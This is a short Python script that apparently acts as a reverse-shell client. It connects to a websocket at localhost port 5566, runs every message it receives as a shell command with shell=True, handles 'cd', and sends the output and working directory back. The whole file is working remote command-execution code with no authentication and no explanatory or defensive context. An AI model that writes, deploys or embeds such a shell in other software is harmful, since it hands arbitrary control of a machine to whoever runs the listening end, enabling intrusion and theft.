import subprocess
import os
import websockets
import asyncio


async def listen():
    url = "ws://localhost:5566/"
    async with websockets.connect(url) as ws:
        while True:
            msg = await ws.recv()
            if msg[:2] == 'cd':
                os.chdir(msg[3:])
                pass
            cmd = subprocess.Popen(msg[:], shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,
                                   stderr=subprocess.PIPE)
            output_byte = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_byte, "utf-8")
            print(output_str)
            currentWD = os.getcwd() + "> "
            await ws.send(output_str + currentWD)


asyncio.get_event_loop().run_until_complete(listen())
